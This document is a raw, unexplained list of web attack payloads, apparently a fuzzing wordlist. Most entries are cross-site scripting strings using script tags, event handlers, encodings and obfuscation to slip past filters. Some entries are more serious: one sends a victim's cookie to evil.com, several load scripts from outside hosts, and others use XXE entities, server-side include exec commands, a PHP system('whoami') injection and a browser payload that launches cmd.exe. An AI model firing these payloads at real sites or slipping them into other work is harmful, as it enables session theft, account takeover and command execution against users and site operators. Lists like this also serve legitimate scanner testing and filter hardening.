&kw=%27;alert%28%27XSS%27%29;//
&type=itpPeople&pageLength=5&q=0\\%22autofocus%2Fonfocus%3Dalert%28%2FXSSPO+SED%2F%29--%3E%3Cvideo%2Fposter%2Fonerror%3Dprompt%28%2FXSSPOSED%2F%29%3E%22-confirm%28%2FXSSPOSED%2F%29-%22
%253C%252500%252Ftitle%253E
&#x0003C;
"<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""http://www.example.com/text.txt"" >]>"
</style></script><script>alert(0x000123)</script>
"&zoom_query=[email]&zoom_per_page=AWWWWYEEEEEEAH&zoom_and=0&zoom_sort=1%3E%22%3E%3CScRiPt%20%3Ealert%28String.fromCharCode%2878,111,32,114,101,115,117,108,116,115,32,102,111,114,32,34,85,115,101,102,117,108,32,73,110,102,111,114,109,97,116,105,111,110,34%29%29;%3C/ScRiPt%3E"
d=0||'une'+'scape'||0;a=0||'ev'+'al'||0;b=0||'locatio';b+=0||'n'||0;c=b[a];d=c(d);c(d(c(b)))
<x contenteditable oninput=alert(1)>input here!
"""<IMG LOWSRC=""""javascript:alert('XSS')"""">"""
-alert(1)-
${@print(system(â€œwhoamiâ€))}
'></SCRIPT>â€>â€><SCRIPT>prompt(1)</SCRIPT>
"<body onload=""alert(1)"">"
"<meta http-equiv=""X-UA-Co"" content=x=EmulateIE10><canvas id=x><body onload=x.getContext(""2d"").fillText(x,0,0,.0001)>"
Array[Symbol.species].constructor('alert(1)')();
"\'"">><marquee><h1>1</h1></marquee>"
Ã¢â‚¬Å“><img src= onerror=confirm(1)>
<script>prompt(-[])</script>
â€œ;confirm(1)//
"<a href=""\\xE2\\x80\\x83javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>"
"document.getElementsByName(""login"").item(0).src = http://xss.cx/"
"""</TITLE><SCRIPT>alert(""""XSS"""");</SCRIPT>"""
"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:confirm(document.location);"">"
""">< %3C &lt &lt; &LT &LT; &#60 &#060 &#0060 &#00060 &#000060 &#0000060 &#60; &#060; &#0060; &#00060; &#000060; &#0000060; &#x3c &#x03c &#x003c &#x0003c &#x00003c &#x000003c &#x3c; &#x03c; &#x003c; &#x0003c; &#x00003c; &#x000003c; &#X3c &#X03c &#X003c &#X0003c &#X00003c &#X000003c &#X3c; &#X03c; &#X003c; &#X0003c; &#X00003c; &#X000003c; &#x3C &#x03C &#x003C &#x0003C &#x00003C &#x000003C &#x3C; &#x03C; &#x003C; &#x0003C; &#x00003C; &#x000003C; &#X3C &#X03C &#X003C &#X0003C &#X00003C &#X000003C &#X3C; &#X03C; &#X003C; &#X0003C; &#X00003C; &#X000003C; \x3c \x3C \u003c \u003C"
"""><comment><img src=""</comment><img src=x onerror=prompt(1)//"">"
"<!--<value><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC=""javas<![CDATA[cript:confirm(document.location);"">"
"""><a href=javascript&colon;confirm&lpar;document&period;cookie&rpar;>Click Here</a>"
"<TABLE><TD BACKGROUND=""javascript:alert('CrossSiteScripting')"">"
"<LAYER SRC=""%(scriptlet)s""></LAYER>"
"<meta http-equiv=""refresh"" content=""0; url=data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"">"
"""><link rel=import href=data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;"
"&lt;BGSOUND SRC=\\""javascript&#058;alert(\'XSS\');\\""&gt;"
"&lt;STYLE TYPE=\\""text/javascript\\""&gt;alert(\'XSS\');&lt;/STYLE&gt;"
'><img language=â€JScript.Encodeâ€ onerror=â€#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@â€ src=a>
"s1=<s>evalalerta(1)a</s>,s2=<s></s>+'',s3=s1+s2,e1=/s/!=/s/?s3[0]:0,e2=/s/!=/s/?s3[1]:0,e3=/s/!=/s/?s3[2]:0,e4=/s/!=/s/?s3[3]:0,e=/s/!=/s/?0[e1+e2+e3+e4]:0,a1=/s/!=/s/?s3[4]:0,a2=/s/!=/s/?s3[5]:0,a3=/s/!=/s/?s3[6]:0,a4=/s/!=/s/?s3[7]:0,a5=/s/!=/s/?s3[8]:0,a6=/s/!=/s/?s3[10]:0,a7=/s/!=/s/?s3[11]:0,a8=/s/!=/s/?s3[12]:0,a=a1+a2+a3+a4+a5+a6+a7+a8,1,e(a)"
%253Cs%26%2399%3Bri%26%23112%3Bt%2520s%26%23114%3Bc%253D%252F%252Fxy%252Ehn%252Fa%252Ejs%2520%253E%253C%252Fs%26%2399%3B%26%23114%3Bi%26%23112%3Bt%253E
"<image src=1 href=1 onerror=""javascript:alert(1)""></image>"
'><svg onload=prompt(1);>
<body/onpageshow=alert(1)>
"class X {public static function main() { flash.Lib.getURL(new flash.net.URLRequest(flash.Lib._root.url||""javascript:alert(1)""),flash.Lib._root.name||""_top""); }}"
"`""\'><img src=xxx:x \\x00onerror=javascript:alert(1)>"
"</script>""//'//<svg%0Aonload=alert(1) //>"
&lt;script&gt;prompt(&apos;1&apos;)&lt;/script&gt;
<iframe src=mhtml:http://html5sec.org/test.html!xss.html></iframe><iframe src=mhtml:http://html5sec.org/test.gif!xss.html></iframe>
<iframe/src \/\/onload = prompt(1)
"""><body onfocus=""location='javascrpt:alert(1) >123"
"<img src=""1"" onerror=""alert('1')"">"
&template=en_search_error&postalCode=\\';alert(0)//
<sc<script>ript>alert(123)</sc</script>ript>
"</textarea>'""><script>alert(document.cookie)</script>"
"<a href=""javas\x03cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>"
<b <script>alert(1)</script>0
"""><body scroll=alert(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>"
<video src onloadstart=alert(1)>
http://aa<script>alert(123)</script>
"""></script><script >alert(1)</script>"
<body onload=a1={x:this.parent.document};a1.x.writeln(1);>
%3Cdiv%20style%3Dposition%3Afixed%3Btop%3A0px%3Bleft%3A0px%3Bbackground%2Dcolor%3A%23FFFFFF%3Bwidth%3A100%25%3Bheight%3A100%25%3Btext%2Dalign%3Acenter%3Bz%2Dindex%3A11%3B%20%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Ca%20href%3D%3Fxss%3D%253Cs%26%2399%3Bri%26%23112%3Bt%2520s%26%23114%3Bc%253D%252F%252Fxy%252Ehn%252Fa%252Ejs%2520%253E%253C%252Fs%26%2399%3B%26%23114%3Bi%26%23112%3Bt%253E%3EThe%20requested%20page%20has%20moved%20here%3C%2Fa%3E%3C%2Fdiv%3E
location='javascript:%61%6c%65%72%74%28%31%29'
"<DIV STYLE=""background-image: url(javascript:confirm(5))"">"
-1<SCRIPT>a=/CrossSiteScripting/\ndocument.cookie=true;</SCRIPT>
<svg><a xyz:href=123><text>test</text></svg>
"""><a fooooooooooooooooooooooooooooooooo href=JaVAScript%26colon%3Bprompt%26lpar%3B1%26rpar%3B%>"
'><script>alert%281%29</script>
"<!--#exec cmd=""/bin/echo '<SCRIPT SRC'""--><!--#exec cmd=""/bin/echo '=http://xss.cx/xss.js></SCRIPT>'""-->"
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:///dev/random"">]><foo>&xee;</foo>"
&#x3C;
'><svg onload=document.body.innerHTML=location.hash>#<img src='x'onerror=alert(1)>
"<IMG SRC=`javascript:alert(â€œX says, â€˜Xâ€™â€)`>"
"<a href=""\\x15javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>"
'><meta charset=utf-7><img src=x o%2BAG4-error=alert(1)>
<xml id=cdcat><note><to>%26lt;span style=x:exp<![CDATA[r]]>ession(confirm(3))%26gt;hello%26lt;/span%26gt;</to></note></xml><table border=%221%22 datasrc=%22%23cdcat%22><tr><td><span datafld=%22to%22 DATAFORMATAS=html></span></td></tr></table>
&#X003e
"<? foo=""><x foo=\'?><script>alert(1)</script>\'>"">"
"'><SCRIPT a="">'>"" SRC=""http://127.0.0.1:3555/xss_serve_payloads/X.js""></SCRIPT>"
&event=11&broadcastType=1&jspLocation=/jsp/tv_listings_search.jsp&jspError=/jsp/error.jsp&searchString=%3CIMG%20%22%22%22%3E%3CSCRIPT%3Ealert%28%22XSS%22%29%3C/SCRIPT%3E%22%3E
"<script src=""data:text/javascript,alert(1)""></script>"
<img src ?itworksonchrome?\/onerror = confirm(1)???
&#X00003E
"<div style=""[a]color[b]:[c]red"">XXX</div>"
"<embed code=""http://127.0.0.1:3555/xss_serve_payloads/flash.swf"" allowscriptaccess=always>"
<IMG ONERROR=â€VBS:MSGBOX 1â€ SRC=A>
"echo('IPT&gt;alert(\""XSS\"")&lt;/SCRIPT&gt;'); ?&gt;"
"\""};with(window){onload=function(){ with(document){k=cookie;};with(window){location='http://evil.com/?a=test'%2bk;};}}//;"
&query=Search-word%3Cscript%3Ealert('Sup%20reddit
"""><b <script>alert(1)//</script>0</script></b>"
"<STYLE>li+{list-style-image:url(""javascript:alert(1)"");}</STYLE><UL><LI>1"
)''.sleep(10).''
"<img src=x onerror=\\x11""javascript:alert(1)"">"
"<IMG SRC=""jav&#x09;ascript:confirm(<WBR>document.location);"">"
"<script>document.body.innerHTML=""<h1>XSS-Here</h1>""</script>"
&topic=The%20O%27Reilly%20Store%3E%3C/title%3E%3C/head%3E%3Cbody%20onload=%22alert%28%27Fuck%20it!%20We%60ll%20do%20it%20live!%27%29;%22%20%3E%3Cimg%20src=%22http://bit.ly/h52DeS%22%20style=%22position:absolute;top:0;left:0;width:250px%22/%3E
%3Cmeta%20charset=hz-gb-2312%3E~{!~}%22%20onfocus=alert%281%29%20autofocus%3E
<IMGSRC=&#x6A&#x61&#x76&#x61&#x73&<WBR>#x63&#x72&#x69&#x70&#x74&#x3A&<WBR>#x61&#x6C&#x65&#x72&#x74&#x28&<WBR>#x27&#x58&#x53&#x53&#x27&#x29>
"<a href=""\\xE2\\x80\\x8Ajavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>"
javascript:alert(1)
"<div draggable=""true"" ondragstart=""event.dataTransfer.setData('text/plain','malicious code');"">	<h1>Drop me</h1></div><iframe src=""http://www.example.org/dropHere.html""></iframe>"
"""; alert&#40 3&#41 ; """
<iframe><iframe src=javascript:confirm(4)></iframe>
foo%00<script>alert(document.cookie)</script>
<div style=width:1px;filter:glow onfilterchange=alert(1)>x</div>
""" onfocus=JaVaSCript:alert(123) autofocus"
"<a href=""#"" onClick=""alert(document.domain)""><img title=""Click me"" /></a>"
%3Cs%26%23x63%3Bri%26%23x70%3Bt%20s%26%23x72%3Bc%3Dhttp%3A%2F%2Fxs%26%23s63%3B.cx%2Fxss%2Ejs%3E%3C%2Fs%26%23x63%3Bri%26%23x70%3Bt%3E
"<HTML><BODY><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributeName=""innerHTML"" to=""XSS&lt;SCRIPT DEFER&gt;javascript:alert(1)&lt;/SCRIPT&gt;""></BODY></HTML>"
"<iframe onLoad iframe onLoad=""javascript:javascript:alert(1)""></iframe onLoad>"
<frameset><frame/src=//xss.cx>
try{'a' (alert(1)) in 'a'}catch(e){	'a' (alert(2)) instanceof 'a'}
"""'`>ABC<div style=""font-family:'foo*chr*;x:expression(log(*num*));/*';"">DEF"
"<math><a xlink:href=""//jsfiddle.net/t846h/"">click"
"""/><img/onerror=\x0Ajavascript:alert(1)\x0Asrc=xxx:x />"
"<a href=""\\xE2\\x80\\x89javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>"
"""><table background=""javascript:alert(1)""></table>"
"<iframe srcdoc=""&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:alert(1)&amp;gt;>"">"
"""><scrip<script>t>alert(1)</script>"
<xmp> <% </xmp> <img alt='%></xmp><img src=xx:x onerror=alert(1)//'>  <script> x='<%' </script> %>/ alert(2) </script>  XXX <style> *['<!--']{} </style> -->{} *{color:red}</style>
"<SCRIPT/XSS SRC=""http://xss.cx/xss.js""></SCRIPT>"
"perl -e 'print ""<IMG SRC=java\0script:alert(\""XSS\"")>"";' > out"
"<script>â€™alert(1)â€™.replace(/.+/,eval)</script>"
"?playerID=a\"";))}catch(e){confirm(document.domain)}//"
"data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4="
foo%00<script>alert(1)</script>
"10,103,64,82,69,77,79,86,69,34,41,60,47,115,99,114,105,112,116,62));"">String:fr"
%253C%253Fxml-stylesheet%2520type%253D%2522text%252Fcss%2522%253F%253E%253Croot%2520style%253D%2522x%253Aexpression%2528write%25281%2529%2529%2522%252F%253E
"""><script src=""file:///c:/wonderful.js""></script><"""
"<div id=d><div style=""font-family:'sans\27\2F\2A\22\2A\2F\3B color\3Ared\3B'"">X</div></div><script>with(document.getElementById(""d""))innerHTML=innerHTML</script>"
"<script>x=document.createElement(%22iframe%22);x.src=%22http://xssme.html5sec.org/404%22;x.onload=function(){window.frames[0].document.write(%22<script>Object.defineProperty(parent,'Safe',{value:{}});Object.defineProperty(parent.Safe,'get',{value:function(){return top.document.cookie}});alert(parent.Safe.get())<\\/script>%22)};document.body.appendChild(x);</script>"
%00â€œ><script>alert(1)</script>
<<script>alert(0)</script>
"&lt;IMG SRC=\\""jav&#x0D;ascript&#058;alert(\'XSS\');\\""&gt;"
"-1<img dynsrc=""javascript:document.cookie=true;"">"
"\""; alert(0x000123)"
&Referer=lolwat%27%29;alert%28document.cookie%29;new%20Button%28%27
&src=%27%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Ealert%28%27xss%27%29%3C/script%3E
"&product=edpr&additional=""><script>alert(String.fromCharCode(88,83,83))</script>"
<font style='color:expression(alert(1))'>
"<object data=""javascript:alert(1)"">"
"</script>'//<svg ""%0Aonload=alert(1) //>"
&searchfor=%22/%3E%3Cscript%3Ealert%28%22XSS%22%29%3C/script%3E%3Cdiv%20%22&incWriters=&incPublishers=&incArtists=&incAltTitles=&TypeOfSearch=title
"""><svg><script>prompt&#40 1&#41</script>"
"<script>confirm(Components.lookupMethod(Components.lookupMethod(Components.lookupMethod(Components.lookupMethod(this,'window')(),'document')(), 'getElementsByTagName')('html')[0],'innerHTML')().match(/d.*'/));</script>"
"<IMG SRC=""jav&amp;#x0A;ascript:alert('XSS');"">"
">""<>""<script>confirm(1)</script>"
"'><script>alert(String.fromCharCode(75,67,70))</script>"
"<script>x=""""+prompt(9)+"""";y=42;</script>"
"""/><img/onerror=\x60javascript:alert(1)\x60src=xxx:x />"
"<base+href=""javascript:alert(1);//"">"
a=<script>alert(1);/*&b=*/</script>
"<object data=""data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB 4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy 8xOTk5L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAwIiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlhTUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="" type=""image/svg+xml""></object> // Firefox only"
"'><meta content=""&NewLine; 1 &NewLine;;JAVASCRIPT&colon; alert(1)"" http-equiv=""refresh""/>"
Redirect 302 /vlab.jpg http://vulnerability-lab.com/admin.asp&deleteuser
"'><img src=""x:gif"" onerror=""eval('al'%2b'lert(1)')"">"
"""><img style=""xss:expression(alert(1))"">"
"""><body onpageshow=alert(1)>"
<frameset onload=javascript:javascript:alert(1)></frameset>
onload=confirm(1)//
&#60;BR SIZE&#61;&#34;&#38;&#123;alert&#40;&#39;XSS&#39;&#41;&#125;&#34;&#62;
"&lt;META HTTP-EQUIV=\\""Set-Cookie\\"" Content=\\""USERID=&lt;SCRIPT&gt;alert(\'XSS\')&lt;/SCRIPT&gt;\\""&gt;"
<script\x0A>javascript:alert(1)</script>
"<A HREF=""http://1113982867/"">XSS</A>"
'><IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
"<img src=x onerror=\\x32""javascript:alert(1)"">"
"<XSS STYLE=""behavior: url(http://ha.ckers.org/xss.htc);"">"
"<LINK REL=""stylesheet"" HREF=""http://vulnerability-lab.com/CrossSiteScripting.css"">"
"<img\x32src=x onerror=""javascript:alert(1)"">"
"<div/onmouseover=\'alert(1)\'> style=""x:"">"
<w contenteditable id=x onfocus=alert()>
"-1<img src=""blah""onmouseover=""document.cookie=true;"">"
'-alert(1)//
"<A HREF=""http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D"">XSS</A>"
%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e
"""><div style=""list-style:url(http://foo.f)\20url(javascript:alert(1));"">X</div>"
"<STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>"
|alert(1)|
"\""><img Src=0x94 onerror=alert(0x000123)>"
"<! XSS=""><img src=xx:x onerror=confirm(1)//"">"
"<img src=""blah""onmouseover=""document.cookie=true;"">"
</script><svg onload=alert(1)>
<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js'
"<img src=""x:gif"" onerror=""window['al\u0065rt'](1)""></img>"
"<embed src=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf""> ?"
'><img[%0d]onerror=alert(1) src=a>
//<form/action=javascript&#x3A;confirm&lpar;document&period;cookie&rpar;><input/type='submit'>//
"width:\0065\0078\0070\0072\0065\0073\0073\0069\006F\006E\0028\0070\0072\006F\006D\0070\0074\0028\0031\0029\0029"""
"<IMG SRC=""jav	ascript:javascript:alert(1);"">"
"<img src=x\\x13onerror=""javascript:alert(1)"">"
"navigatorurl:test"" -chrome ""javascript:C=Components.classes;I=Components.interfaces;file=C[\'@mozilla.org/file/local;1\'].createInstance(I.nsILocalFile);file.initWithPath(\'C:\'+String.fromCharCode(92)+String.fromCharCode(92)+\'Windows\'+String.fromCharCode(92)+String.fromCharCode(92)+\'System32\'+String.fromCharCode(92)+String.fromCharCode(92)+\'cmd.exe\');process=C[\'@mozilla.org/process/util;1\'].createInstance(I.nsIProcess);process.init(file);process.run(true%252c{}%252c0);alert(process)"
<a href=javascript&colon;confirm&lpar;document&period;cookie&rpar;>Click-XSS</a>
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+//+/onmouseover=1/+/[*/[]/+alert(1)//'>
"<script>var url = ""<!--<script>"";//</script>alert(1)</script>"
"<form id=""test"" /><button form=""test"" formaction=""javascript:javascript:alert(1)"">X"
"<IMG DYNSRC=""javascript:alert('XSS')"">"
<svg%20onload=evt.target.innerHTML=evt.target.ownerDocument.URL>#<img src=/ onerror=alert(domain)>
1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:alert(1) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>
"<a href=""\x1Cjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>"
<img src ?itworksonchrome?\/onerror = confirm(1)
"""><!a foo=x=`y><img alt=""`><img src=x:x onerror=alert(2)//"">"
&q=%3Cbody+onload%3Dalert(%22XSS%22);%3E
><option>'><button><img src=x onerror=confirm(1);></button></option>
\\u003C
"<style type=""text/javascript"">document.cookie=true;</style>"
"<meta http-equiv=""X-UA-Compatible"" content=""IE=5""><a style=""><!$%/()=?`C\o\l\o\r!?=red"">A"
%3Cs%26%2399%3Bri%26%23112%3Bt%20s%26%23114%3Bc%3D%2F%2Fxy%2Ehn%2Fa%2Ejs%20%3E%3C%2Fs%26%2399%3B%26%23114%3Bi%26%23112%3Bt%3E
alert&#x28;1&#x29
"""&<script>document.write(""""XSS-XSS-XSS"""");</script>"""
"<div>jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e</div>"
<style>*{x:\xc3\xaf\xc2\xbd\xc2\x85\xc3\xaf\xc2\xbd\xc2\x98\xc3\xaf\xc2\xbd\xc2\x90\xc3\xaf\xc2\xbd\xc2\x92\xc3\xaf\xc2\xbd\xc2\x85\xc3\xaf\xc2\xbd\xc2\x93\xc3\xaf\xc2\xbd\xc2\x93\xc3\xaf\xc2\xbd\xc2\x89\xc3\xaf\xc2\xbd\xc2\x8f\xc3\xaf\xc2\xbd\xc2\x8e(write(1))}</style>
"&issue=%22+onfocus=if%28!this.a%29{alert%28String.fromCharCode%2888,83,83%29%29;this.a=1;}//%20AUTOFOCUS=%22&id_prd=-1&id_pty=-1&type=3&stype=1&MM_submit=Perform+search"
"&lt;BGSOUND SRC=""javascript:alert(1);""&gt;"
<script>document.write(Array(184).join('<marquee>'))</script>
"<meta http-equiv=Set-Cookie content=""testltbn=2311"">"
'><script>~'\u0061' ;  \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073.  \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+
'><BODY ONLOAD=alert(1)>
&lt
&#x0003C
"';confirm(String.fromCharCode(88,83,83))//';confirm(String.fromCharCode(88,83,83))//"";"
"<video onerror=""javascript:javascript:alert(1)""><source>"
"""><%div%20style=xss:expression(prompt(1))>"
%22]);}catch(e){}if(!self.a)self.a=!alert(1);/
<svg/onload=location=/java/.source+/script/.source+location.hash[1]+/al/.source+/ert/.source+location.hash[2]+/docu/.source+/ment.domain/.source+location.hash[3]#:()
"<SCRIPT> alert(\""1\"");</SCRIPT>"
"javascript:prompt(1)#{""action"":1}"
&q=%22%3E%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E
javascript:confirm(1)//
'<script>window.onload=function(){document.forms[0].message.value='1';}</script>
<div onfocus=alert('xx') id=xss style=display:table>
"<div id=""x"">XXX</div><style>#x{font-family:foo[bar;color:green;}#y];color:red;{}</style>"
"<body language=vbs onload=window.location='data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+'>"
<iframe src=http://127.0.0.1:3555/xss_serve_payloads/X.html <
"<event-source src=""event.php"" onload=""alert(1)"">"
"""`\'><script>\\xE1\\x9A\\x80javascript:alert(1)</script>"
"<body onkeydown body onkeydown=""javascript:javascript:alert(1)""></body onkeydown>"
&q=%3Cscript%3Ealert('Hello%20Reddit');%3C/script%3E
"'><img src=x onerror=window.open('http://127.0.0.1:3555/xss_serve_payloads/X.html""');>"
'><h1>X</h1>
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:javascript:alert(1)></OBJECT>
"""><script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/X/)></script"
%253Cscript%253Ealert(1)%253C/script%253E
"<img src=x onerror=\\x00""javascript:alert(1)"">"
<isindex action=javascript:alert(1) type=image>
<///style///><span %2F onmousemove='confirm&lpar;1&rpar;'>SPAN
x=new class extends Function{}('alert(1)');x=new x;
"&lt;BODY BACKGROUND=""javascript:alert(1)""&gt;"
"'><script\x20type=""text/javascript"">javascript:alert(1);</script>"
